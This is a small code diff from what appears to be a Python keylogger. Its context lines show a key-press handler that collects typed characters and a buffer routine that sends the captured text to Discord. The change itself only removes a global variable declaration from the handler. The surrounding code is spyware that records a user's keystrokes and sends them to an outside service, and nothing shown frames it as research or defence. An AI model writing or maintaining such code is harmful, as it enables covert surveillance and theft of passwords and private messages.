@@ -28,7 +28,6 @@ def process_buffer():
                 send_to_discord(message)
 
 def on_press(key):
-    global key_buffer
     try:
         char = getattr(key, 'char', None)
         if char is not None:
